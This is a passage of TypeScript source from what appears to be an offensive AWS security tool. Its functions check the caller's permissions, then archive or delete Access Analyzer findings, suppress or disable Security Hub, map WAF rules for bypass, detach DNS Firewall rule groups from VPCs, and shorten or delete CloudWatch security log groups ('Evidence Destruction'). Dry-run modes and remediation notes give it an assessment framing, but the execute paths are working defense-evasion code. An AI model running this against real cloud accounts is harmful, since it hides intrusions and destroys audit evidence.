  output.push(`[*] Detection: Security Hub finding for deleted analyzer, Config rule noncompliance`)

  const analyzers = await aws(["accessanalyzer", "list-analyzers", "--query", "analyzers[].[arn,name,type,status]"], profile, region, timeout)
  if (analyzers.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot list analyzers: ${analyzers.stderr.trim()}`, findings }

  const al = tryJson(analyzers.stdout) || []
  output.push(`\n[+] Access Analyzers: ${al.length}`)
  for (const a of al as string[][]) {
    output.push(`\n  ${a[1]} (${a[2]}) — ${a[3]}`)
    const isOrg = a[2] === "ORGANIZATION"
    if (isOrg) output.push(`    [!] Organization-level analyzer — covers all member accounts`)

    const aaFindings = await aws(["accessanalyzer", "list-findings", "--analyzer-arn", a[0], "--query", "findings[].[id,resourceType,resource,status]"], profile, region, timeout)
    if (aaFindings.exitCode === 0) {
      const fl = tryJson(aaFindings.stdout) || []
      const active = (fl as string[][]).filter(f => f[3] === "ACTIVE")
      const resolved = (fl as string[][]).filter(f => f[3] === "RESOLVED")
      const archived = (fl as string[][]).filter(f => f[3] === "ARCHIVED")
      output.push(`    Findings: ${fl.length} total — ${active.length} active, ${resolved.length} resolved, ${archived.length} archived`)

      const byType: Record<string, number> = {}
      for (const f of active) { byType[f[1]] = (byType[f[1]] || 0) + 1 }
      if (Object.keys(byType).length > 0) {
        output.push(`    Active by type: ${Object.entries(byType).map(([k, v]) => `${k}=${v}`).join(", ")}`)
      }

      if (action === "archive" && active.length > 0) {
        if (!allowed.has("access-analyzer:UpdateFindings")) {
          output.push(`    [-] access-analyzer:UpdateFindings DENIED — archive blocked`)
          findings.push({ checkId: "AWS-EVASION-AA-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `accessanalyzer:${a[1]}`, title: "Access Analyzer finding archive blocked", details: "Cannot update finding status", remediation: "N/A" })
          continue
        }
        if (!execute) {
          output.push(`    [+] DRY RUN — would archive ${Math.min(active.length, 50)} active finding(s)`)
          findings.push({ checkId: "AWS-EVASION-006", provider: "aws", severity: "high", status: "READY", resource: `accessanalyzer:${a[1]}`, title: `Access Analyzer archive viable: ${active.length} findings`, details: "UpdateFindings permission confirmed — external access findings can be hidden", remediation: "Restrict access-analyzer:UpdateFindings" })
          continue
        }
        let archived2 = 0
        for (const f of active.slice(0, 50)) {
          const archive = await aws(["accessanalyzer", "update-findings", "--analyzer-arn", a[0], "--ids", f[0], "--status", "ARCHIVED"], profile, region, timeout)
          if (archive.exitCode === 0) { archived2++; output.push(`    [+] Archived: ${f[0]} (${f[1]}: ${f[2]})`) }
        }
        findings.push({ checkId: "AWS-EVASION-006", provider: "aws", severity: "high", status: "SUPPRESSED", resource: `accessanalyzer:${a[1]}`, title: `Access Analyzer findings archived: ${archived2}`, details: `${archived2} active findings archived to hide excessive external access. CloudTrail event: UpdateFindings`, remediation: "Unarchive findings and investigate external access" })
      }

      if (action === "delete") {
        if (!allowed.has("access-analyzer:DeleteAnalyzer")) {
          output.push(`    [-] access-analyzer:DeleteAnalyzer DENIED — delete blocked`)
          findings.push({ checkId: "AWS-EVASION-AA-002", provider: "aws", severity: "info", status: "BLOCKED", resource: `accessanalyzer:${a[1]}`, title: "Access Analyzer deletion blocked", details: "Cannot delete analyzer", remediation: "N/A" })
          continue
        }
        if (!execute) {
          output.push(`    [+] DRY RUN — would delete analyzer: ${a[1]}`)
          findings.push({ checkId: "AWS-EVASION-007", provider: "aws", severity: "critical", status: "READY", resource: `accessanalyzer:${a[1]}`, title: `Access Analyzer deletion viable: ${a[1]}`, details: `DeleteAnalyzer permission confirmed — ${isOrg ? "org-wide" : "account-level"} external access detection will stop`, remediation: "Restrict access-analyzer:DeleteAnalyzer via SCP" })
          continue
        }
        const del = await aws(["accessanalyzer", "delete-analyzer", "--analyzer-name", a[1]], profile, region, timeout)
        if (del.exitCode === 0) {
          output.push(`    [+] Analyzer deleted: ${a[1]}`)
          findings.push({ checkId: "AWS-EVASION-007", provider: "aws", severity: "critical", status: "DELETED", resource: `accessanalyzer:${a[1]}`, title: `Access Analyzer deleted: ${a[1]}`, details: `Analyzer removed — external access will no longer be detected. CloudTrail event: DeleteAnalyzer`, remediation: "Recreate analyzer for account/organization" })
        }
      }
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("access-analyzer:UpdateFindings")) viable.push("archive")
    if (allowed.has("access-analyzer:DeleteAnalyzer")) viable.push("delete")
    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
    output.push(`[*] Use --action archive|delete [--execute]`)
  }

  return { output: output.join("\n"), findings }
}

export async function securityHubSuppress(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] Security Hub — Finding Suppression\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["securityhub:DescribeHub", "securityhub:GetFindings", "securityhub:BatchUpdateFindings", "securityhub:DisableSecurityHub"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: BatchUpdateFindings, DisableSecurityHub`)
  output.push(`[*] Detection: org admin sees member disable, Config rule noncompliance`)

  const hub = await aws(["securityhub", "describe-hub"], profile, region, timeout)
  if (hub.exitCode !== 0) return { output: output.join("\n") + `\n[-] Security Hub not enabled: ${hub.stderr.trim()}`, findings }

  const hubInfo = tryJson(hub.stdout)
  output.push(`\n[+] Security Hub: ${hubInfo?.HubArn}`)
  output.push(`  Subscribed: ${hubInfo?.SubscribedAt}`)
  if (hubInfo?.AutoEnableControls !== undefined) output.push(`  Auto-enable controls: ${hubInfo.AutoEnableControls}`)

  const admin = await aws(["securityhub", "get-administrator-account"], profile, region, timeout)
  if (admin.exitCode === 0) {
    const adm = tryJson(admin.stdout)?.Administrator
    if (adm?.AccountId) output.push(`  [!] Org admin: ${adm.AccountId} (${adm.MemberStatus}) — disable may be blocked`)
  }

  const standards = await aws(["securityhub", "get-enabled-standards", "--query", "StandardsSubscriptions[].[StandardsArn,StandardsStatus]"], profile, region, timeout)
  if (standards.exitCode === 0) {
    const sl = tryJson(standards.stdout) || []
    output.push(`  Enabled standards: ${sl.length}`)
    for (const s of sl as string[][]) output.push(`    ${(s[0] || "").split("/").pop()} — ${s[1]}`)
  }

  const shFindings = await aws(["securityhub", "get-findings", "--filters", '{"WorkflowStatus":[{"Value":"NEW","Comparison":"EQUALS"}],"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"},{"Value":"HIGH","Comparison":"EQUALS"}]}', "--max-items", "50"], profile, region, timeout)
  if (shFindings.exitCode === 0) {
    const fl = tryJson(shFindings.stdout)?.Findings || []
    output.push(`\n[+] Active CRITICAL/HIGH findings: ${fl.length}`)

    const byProduct: Record<string, number> = {}
    for (const f of fl as Record<string, string>[]) {
      const product = (f.ProductArn || "").split("/").pop() || "unknown"
      byProduct[product] = (byProduct[product] || 0) + 1
    }
    if (Object.keys(byProduct).length > 0) output.push(`  By source: ${Object.entries(byProduct).map(([k, v]) => `${k}=${v}`).join(", ")}`)

    for (const f of (fl as Record<string, string>[]).slice(0, 15)) {
      output.push(`  ${f.SeverityLabel} ${f.Title}`)
    }

    if (action === "suppress" && fl.length > 0) {
      if (!allowed.has("securityhub:BatchUpdateFindings")) {
        output.push(`\n[-] securityhub:BatchUpdateFindings DENIED — suppress blocked`)
        findings.push({ checkId: "AWS-EVASION-SH-001", provider: "aws", severity: "info", status: "BLOCKED", resource: hubInfo?.HubArn || "securityhub", title: "Security Hub suppression blocked", details: "Cannot batch-update findings", remediation: "N/A" })
        return { output: output.join("\n"), findings }
      }
      const updates = (fl as Record<string, string>[]).slice(0, 50).map(f => ({ Id: f.Id, ProductArn: f.ProductArn }))
      if (!execute) {
        output.push(`\n[+] DRY RUN — would suppress ${updates.length} finding(s)`)
        findings.push({ checkId: "AWS-EVASION-008", provider: "aws", severity: "critical", status: "READY", resource: hubInfo?.HubArn || "securityhub", title: `Security Hub suppression viable: ${updates.length} findings`, details: "BatchUpdateFindings permission confirmed — critical findings can be hidden", remediation: "Restrict securityhub:BatchUpdateFindings via SCP" })
        return { output: output.join("\n"), findings }
      }
      const r = await aws(["securityhub", "batch-update-findings", "--finding-identifiers", JSON.stringify(updates), "--workflow", '{"Status":"SUPPRESSED"}'], profile, region, timeout)
      if (r.exitCode === 0) {
        output.push(`\n[+] Suppressed ${updates.length} finding(s)`)
        findings.push({ checkId: "AWS-EVASION-008", provider: "aws", severity: "critical", status: "SUPPRESSED", resource: hubInfo?.HubArn || "securityhub", title: `Security Hub findings suppressed: ${updates.length}`, details: "Critical/High findings suppressed — CloudTrail event: BatchUpdateFindings", remediation: "Review and resolve suppressed findings" })
      }
    }
  }

  if (action === "disable") {
    if (!allowed.has("securityhub:DisableSecurityHub")) {
      output.push(`\n[-] securityhub:DisableSecurityHub DENIED — disable blocked`)
      findings.push({ checkId: "AWS-EVASION-SH-002", provider: "aws", severity: "info", status: "BLOCKED", resource: hubInfo?.HubArn || "securityhub", title: "Security Hub disable blocked", details: "Cannot disable Security Hub", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    if (!execute) {
      output.push(`\n[+] DRY RUN — would disable Security Hub entirely`)
      findings.push({ checkId: "AWS-EVASION-009", provider: "aws", severity: "critical", status: "READY", resource: hubInfo?.HubArn || "securityhub", title: "Security Hub disable viable", details: "DisableSecurityHub permission confirmed — all security findings will stop", remediation: "Restrict securityhub:DisableSecurityHub via SCP" })
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["securityhub", "disable-security-hub"], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`\n[+] Security Hub DISABLED`)
      findings.push({ checkId: "AWS-EVASION-009", provider: "aws", severity: "critical", status: "DISABLED", resource: hubInfo?.HubArn || "securityhub", title: "Security Hub disabled", details: "Security Hub completely disabled — no security findings generated. CloudTrail event: DisableSecurityHub", remediation: "Re-enable: aws securityhub enable-security-hub" })
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("securityhub:BatchUpdateFindings")) viable.push("suppress")
    if (allowed.has("securityhub:DisableSecurityHub")) viable.push("disable")
    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
    output.push(`[*] Use --action suppress|disable [--execute]`)
  }

  return { output: output.join("\n"), findings }
}

export async function wafBypass(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] WAF Bypass — Web ACL Analysis\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["wafv2:ListWebACLs", "wafv2:GetWebACL", "wafv2:UpdateWebACL", "wafv2:DeleteWebACL", "wafv2:ListIPSets", "wafv2:ListRegexPatternSets"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: UpdateWebACL, DeleteWebACL, UpdateIPSet`)
  output.push(`[*] Detection: WAF logging shows rule changes, Config rule for WAF association`)

  const webAcls = await aws(["wafv2", "list-web-acls", "--scope", "REGIONAL", "--query", "WebACLs[].[Name,Id,ARN]"], profile, region, timeout)
  if (webAcls.exitCode === 0) {
    const wl = tryJson(webAcls.stdout) || []
    output.push(`\n[+] Regional Web ACLs: ${wl.length}`)
    for (const w of wl as string[][]) {
      output.push(`\n  ${w[0]} (${w[1]})`)
      const desc = await aws(["wafv2", "get-web-acl", "--scope", "REGIONAL", "--name", w[0], "--id", w[1]], profile, region, timeout)
      if (desc.exitCode === 0) {
        const data = tryJson(desc.stdout)
        const acl = data?.WebACL || {}
        const rules = acl.Rules || []
        const defaultAction = acl.DefaultAction ? Object.keys(acl.DefaultAction)[0] : "unknown"
        output.push(`    Rules: ${rules.length}, Default: ${defaultAction}`)
        if (defaultAction === "Allow") output.push(`    [!] Default=Allow — removing all rules exposes unfiltered traffic`)

        let blockRules = 0
        let countRules = 0
        let managedRules = 0
        for (const r of rules as Record<string, unknown>[]) {
          const rAction = Object.keys(r.Action || {})[0] || "count"
          if (rAction === "Block") blockRules++
          if (rAction === "Count") countRules++
          if (r.Statement && (r.Statement as Record<string, unknown>).ManagedRuleGroupStatement) managedRules++
          output.push(`    ${r.Name} — pri:${r.Priority} — ${rAction}${r.OverrideAction ? " (override:" + Object.keys(r.OverrideAction)[0] + ")" : ""}`)
        }
        output.push(`    Summary: ${blockRules} block, ${countRules} count-only, ${managedRules} managed rule groups`)

        const resources = await aws(["wafv2", "list-resources-for-web-acl", "--web-acl-arn", w[2], "--resource-type", "APPLICATION_LOAD_BALANCER"], profile, region, timeout)
        if (resources.exitCode === 0) {
          const rl2 = tryJson(resources.stdout)?.ResourceArns || []
          if (rl2.length > 0) {
            output.push(`    Protected ALBs: ${rl2.length}`)
            for (const r of rl2 as string[]) output.push(`      ${r.split("/").pop()}`)
          }
        }

        const apiGw = await aws(["wafv2", "list-resources-for-web-acl", "--web-acl-arn", w[2], "--resource-type", "API_GATEWAY"], profile, region, timeout)
        if (apiGw.exitCode === 0) {
          const al = tryJson(apiGw.stdout)?.ResourceArns || []
          if (al.length > 0) output.push(`    Protected API Gateways: ${al.length}`)
        }

        if (allowed.has("wafv2:UpdateWebACL")) {
          findings.push({ checkId: "AWS-EVASION-WAF-001", provider: "aws", severity: "critical", status: "READY", resource: w[2], title: `WAF modification viable: ${w[0]}`, details: `UpdateWebACL allowed — can remove ${blockRules} blocking rules or switch default to Allow. Lock-token from GetWebACL required.`, remediation: "Restrict wafv2:UpdateWebACL, enable WAF logging, monitor for rule changes" })
        }
        if (allowed.has("wafv2:DeleteWebACL")) {
          findings.push({ checkId: "AWS-EVASION-WAF-002", provider: "aws", severity: "critical", status: "READY", resource: w[2], title: `WAF deletion viable: ${w[0]}`, details: "DeleteWebACL allowed — can remove WAF entirely (must disassociate resources first)", remediation: "Restrict wafv2:DeleteWebACL via SCP" })
        }
      }
    }
  }

  const cfWebAcls = await aws(["wafv2", "list-web-acls", "--scope", "CLOUDFRONT", "--region", "us-east-1", "--query", "WebACLs[].[Name,Id,ARN]"], profile, undefined, timeout)
  if (cfWebAcls.exitCode === 0) {
    const cl = tryJson(cfWebAcls.stdout) || []
    if (cl.length > 0) {
      output.push(`\n[+] CloudFront Web ACLs: ${cl.length}`)
      for (const c of cl as string[][]) output.push(`  ${c[0]} (${c[1]})`)
    }
  }

  const ipSets = await aws(["wafv2", "list-ip-sets", "--scope", "REGIONAL", "--query", "IPSets[].[Name,Id,ARN]"], profile, region, timeout)
  if (ipSets.exitCode === 0) {
    const il = tryJson(ipSets.stdout) || []
    if (il.length > 0) {
      output.push(`\n[+] IP Sets: ${il.length}`)
      for (const i of il as string[][]) output.push(`  ${i[0]} (${i[1]})`)
      if (allowed.has("wafv2:UpdateWebACL")) output.push(`  [*] Tip: modify IP set to whitelist attacker IP rather than removing rules`)
    }
  }

  const regexSets = await aws(["wafv2", "list-regex-pattern-sets", "--scope", "REGIONAL", "--query", "RegexPatternSets[].[Name,Id]"], profile, region, timeout)
  if (regexSets.exitCode === 0) {
    const rl2 = tryJson(regexSets.stdout) || []
    if (rl2.length > 0) {
      output.push(`\n[+] Regex Pattern Sets: ${rl2.length}`)
      for (const r of rl2 as string[][]) output.push(`  ${r[0]} (${r[1]})`)
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("wafv2:UpdateWebACL")) viable.push("update_acl (remove rules/switch default)")
    if (allowed.has("wafv2:DeleteWebACL")) viable.push("delete_acl")
    output.push(`\n[*] Viable vectors: ${viable.length > 0 ? viable.join(", ") : "NONE — WAF is read-only"}`)
    output.push(`[*] WAF modification requires lock-token from GetWebACL — use AWS console or targeted API calls`)
  }

  return { output: output.join("\n"), findings }
}

export async function dnsFirewallDisable(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] Route 53 Resolver DNS Firewall — DNS Filtering Evasion\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["route53resolver:ListFirewallRuleGroups", "route53resolver:DisassociateFirewallRuleGroup", "route53resolver:DeleteFirewallRuleGroup"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: DisassociateFirewallRuleGroup, DeleteFirewallRuleGroup`)
  output.push(`[*] Detection: Config rule for DNS firewall association, CloudWatch metric on blocked queries dropping`)

  const groups = await aws(["route53resolver", "list-firewall-rule-groups", "--query", "FirewallRuleGroups[].[Id,Name,ShareStatus,OwnerId]"], profile, region, timeout)
  if (groups.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot list DNS firewall groups: ${groups.stderr.trim()}`, findings }

  const gl = tryJson(groups.stdout) || []
  output.push(`\n[+] DNS Firewall Rule Groups: ${gl.length}`)

  for (const g of gl as string[][]) {
    const isShared = g[2] === "SHARED_WITH_ME"
    output.push(`\n  ${g[1]} (${g[0]}) — ${g[2]} — owner: ${g[3]}`)
    if (isShared) output.push(`    [!] Shared by org — deletion blocked, only disassociation possible`)

    const rules = await aws(["route53resolver", "list-firewall-rules", "--firewall-rule-group-id", g[0], "--query", "FirewallRules[].[Name,Action,Priority,FirewallDomainListId]"], profile, region, timeout)
    if (rules.exitCode === 0) {
      const rl = tryJson(rules.stdout) || []
      let blockRules = 0
      let alertRules = 0
      output.push(`    Rules: ${rl.length}`)
      for (const r of rl as string[][]) {
        output.push(`      ${r[0]} — ${r[1]} — pri:${r[2]}`)
        if (r[1] === "BLOCK") blockRules++
        if (r[1] === "ALERT") alertRules++
      }
      output.push(`    Summary: ${blockRules} block, ${alertRules} alert`)
    }

    const assocs = await aws(["route53resolver", "list-firewall-rule-group-associations", "--query", "FirewallRuleGroupAssociations[].[Id,Name,VpcId,FirewallRuleGroupId,Status,Priority,MutationProtection]"], profile, region, timeout)
    if (assocs.exitCode === 0) {
      const al = (tryJson(assocs.stdout) || []).filter((a: string[]) => a[3] === g[0]) as string[][]
      if (al.length > 0) {
        output.push(`    VPC Associations: ${al.length}`)
        for (const a of al) {
          output.push(`      ${a[1]} — VPC: ${a[2]} — ${a[4]} — pri:${a[5]}${a[6] === "ENABLED" ? " [MUTATION-PROTECTED]" : ""}`)
        }

        if (action === "disassociate") {
          if (!allowed.has("route53resolver:DisassociateFirewallRuleGroup")) {
            output.push(`    [-] route53resolver:DisassociateFirewallRuleGroup DENIED — blocked`)
            findings.push({ checkId: "AWS-EVASION-DNS-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `dns:firewall:${g[0]}`, title: "DNS firewall disassociation blocked", details: "Cannot remove DNS firewall from VPCs", remediation: "N/A" })
            continue
          }
          for (const a of al) {
            if (a[6] === "ENABLED") {
              output.push(`      [!] ${a[0]} is mutation-protected — disassociation may fail`)
            }
            if (!execute) {
              output.push(`      [+] DRY RUN — would disassociate from VPC: ${a[2]}`)
              continue
            }
            const r = await aws(["route53resolver", "disassociate-firewall-rule-group", "--firewall-rule-group-association-id", a[0]], profile, region, timeout)
            if (r.exitCode === 0) {
              output.push(`      [+] Disassociated from VPC: ${a[2]}`)
              findings.push({ checkId: "AWS-EVASION-010", provider: "aws", severity: "critical", status: "DISABLED", resource: `dns:firewall:${g[0]}`, title: `DNS Firewall disassociated from VPC: ${a[2]}`, details: `Rule group ${g[1]} removed from VPC ${a[2]} — DNS exfil/C2 no longer blocked. CloudTrail event: DisassociateFirewallRuleGroup`, remediation: "Re-associate firewall rule group with VPC" })
            } else {
              output.push(`      [-] Failed: ${r.stderr.trim()}`)
            }
          }
          if (!execute) {
            findings.push({ checkId: "AWS-EVASION-010", provider: "aws", severity: "critical", status: "READY", resource: `dns:firewall:${g[0]}`, title: `DNS firewall disassociation viable: ${al.length} VPC(s)`, details: "DisassociateFirewallRuleGroup allowed — DNS filtering can be removed", remediation: "Restrict via SCP, enable mutation protection" })
          }
        }
      }
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("route53resolver:DisassociateFirewallRuleGroup")) viable.push("disassociate")
    if (allowed.has("route53resolver:DeleteFirewallRuleGroup")) viable.push("delete (owned groups only)")
    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
    output.push(`[*] Use --action disassociate [--execute]`)
  }

  return { output: output.join("\n"), findings }
}

export async function cloudwatchTamper(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const action = argVal(args, "--action") || "status"
  const groupName = argVal(args, "--log-group")
  const retentionDays = argVal(args, "--retention") || "1"
  const execute = hasFlag(args, "--execute")
  const findings: Finding[] = []
  const output: string[] = ["[*] CloudWatch Logs Tampering — Evidence Destruction\n"]

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["logs:DescribeLogGroups", "logs:DeleteLogGroup", "logs:PutRetentionPolicy", "logs:DeleteLogStream", "logs:DescribeLogStreams"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: DeleteLogGroup, PutRetentionPolicy, DeleteLogStream`)
  output.push(`[*] Detection: CloudWatch alarm on log group metric filters, Config rule for log retention`)

  const groups = await aws(["logs", "describe-log-groups", "--query", "logGroups[].[logGroupName,storedBytes,retentionInDays,kmsKeyId]"], profile, region, timeout)
  if (groups.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: logs:DescribeLogGroups", findings }

  const gl = tryJson(groups.stdout) || []
  output.push(`\n[+] Log groups: ${gl.length}`)

  let totalSizeMB = 0
  for (const g of gl as (string | number | null)[][]) totalSizeMB += Math.round((Number(g[1]) || 0) / 1024 / 1024)
  output.push(`  Total stored: ${totalSizeMB}MB`)

  const securityGroups = gl.filter((g: (string | number | null)[]) => {
    const name = String(g[0]).toLowerCase()
    return name.includes("cloudtrail") || name.includes("guardduty") || name.includes("config") || name.includes("vpc-flow") || name.includes("waf") || name.includes("security") || name.includes("audit") || name.includes("detective")
  })

  const noRetention = (gl as (string | number | null)[][]).filter(g => g[2] === null)
  if (noRetention.length > 0) output.push(`  [!] ${noRetention.length} log group(s) have no retention (never expire)`)

  if (securityGroups.length) {
    output.push(`\n[!] Security-relevant log groups (${securityGroups.length}):`)
    for (const g of securityGroups as (string | number | null)[][]) {
      const sizeMB = Math.round((Number(g[1]) || 0) / 1024 / 1024)
      output.push(`  ${g[0]}  Size: ${sizeMB}MB  Retention: ${g[2] || "never expires"}${g[3] ? "  KMS: encrypted" : ""}`)
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("logs:DeleteLogGroup")) viable.push("delete")
    if (allowed.has("logs:PutRetentionPolicy")) viable.push("reduce_retention")
    if (allowed.has("logs:DeleteLogStream")) viable.push("delete_streams")
    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE — all blocked"}`)
    output.push(`[*] Use --action delete|reduce_retention|delete_streams [--log-group <name>] [--retention <days>] [--execute]`)
    return { output: output.join("\n"), findings }
  }

  if (action === "reduce_retention") {
    if (!allowed.has("logs:PutRetentionPolicy")) {
      output.push(`\n[-] logs:PutRetentionPolicy DENIED — retention reduction blocked`)
      findings.push({ checkId: "AWS-EVASION-CW-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudWatch retention reduction blocked", details: "Cannot modify log retention", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    const targets = groupName ? (gl as (string | number | null)[][]).filter(g => g[0] === groupName) : securityGroups as (string | number | null)[][]
    if (!execute) {
      output.push(`\n[+] DRY RUN — would set retention to ${retentionDays}d on ${targets.length} log group(s):`)
      for (const g of targets) output.push(`  ${g[0]} (current: ${g[2] || "never"})`)
      findings.push({ checkId: "AWS-EVASION-011", provider: "aws", severity: "critical", status: "READY", resource: `cloudwatch:retention:${targets.length}`, title: `Log retention reduction viable: ${targets.length} groups`, details: `PutRetentionPolicy allowed — can set all security groups to ${retentionDays}d`, remediation: "Restrict logs:PutRetentionPolicy, enforce minimum retention via SCP" })
      return { output: output.join("\n"), findings }
    }
    for (const g of targets) {
      const r = await aws(["logs", "put-retention-policy", "--log-group-name", g[0] as string, "--retention-in-days", retentionDays], profile, region, timeout)
      if (r.exitCode === 0) {
        output.push(`[+] Retention set to ${retentionDays}d: ${g[0]}`)
        findings.push({ checkId: "AWS-EVASION-011", provider: "aws", severity: "critical", status: "MODIFIED", resource: `cloudwatch:loggroup:${g[0]}`, title: `Log retention reduced to ${retentionDays}d: ${g[0]}`, details: `Previous: ${g[2] || "never"} → ${retentionDays}d. CloudTrail event: PutRetentionPolicy`, remediation: `Restore: aws logs put-retention-policy --log-group-name '${g[0]}' --retention-in-days ${g[2] || 365}` })
      }
    }
  }

  if (action === "delete") {
    if (!allowed.has("logs:DeleteLogGroup")) {
      output.push(`\n[-] logs:DeleteLogGroup DENIED — deletion blocked`)
      findings.push({ checkId: "AWS-EVASION-CW-002", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudWatch log group deletion blocked", details: "Cannot delete log groups", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    const target = groupName || (securityGroups[0] as (string | number | null)[] | undefined)?.[0]
    if (!target) return { output: output.join("\n") + "\n[-] --log-group required or no security groups found", findings }
    const name = typeof target === "string" ? target : String(target)
    if (!execute) {
      output.push(`\n[+] DRY RUN — would delete log group: ${name}`)
      findings.push({ checkId: "AWS-EVASION-012", provider: "aws", severity: "critical", status: "READY", resource: `cloudwatch:loggroup:${name}`, title: `Log group deletion viable: ${name}`, details: "DeleteLogGroup allowed — all log data will be permanently destroyed", remediation: "Restrict logs:DeleteLogGroup via SCP" })
      return { output: output.join("\n"), findings }
    }
    const r = await aws(["logs", "delete-log-group", "--log-group-name", name], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`[+] Log group deleted: ${name}`)
      findings.push({ checkId: "AWS-EVASION-012", provider: "aws", severity: "critical", status: "DELETED", resource: `cloudwatch:loggroup:${name}`, title: `CloudWatch log group deleted: ${name}`, details: "All log data permanently destroyed. CloudTrail event: DeleteLogGroup", remediation: "Log group and data cannot be recovered — recreate and reconfigure log delivery" })
    } else {
      output.push(`[-] Delete failed: ${r.stderr.trim()}`)
    }
  }

  if (action === "delete_streams") {
    if (!allowed.has("logs:DeleteLogStream")) {
      output.push(`\n[-] logs:DeleteLogStream DENIED — stream deletion blocked`)
      findings.push({ checkId: "AWS-EVASION-CW-003", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudWatch stream deletion blocked", details: "Cannot delete log streams", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    const target = groupName || (securityGroups[0] as (string | number | null)[] | undefined)?.[0]
    if (!target) return { output: output.join("\n") + "\n[-] --log-group required", findings }
    const name = typeof target === "string" ? target : String(target)

    const streams = await aws(["logs", "describe-log-streams", "--log-group-name", name, "--order-by", "LastEventTime", "--descending", "--limit", "50", "--query", "logStreams[].logStreamName"], profile, region, timeout)
    if (streams.exitCode === 0) {
      const stl = tryJson(streams.stdout) || []
      if (!execute) {
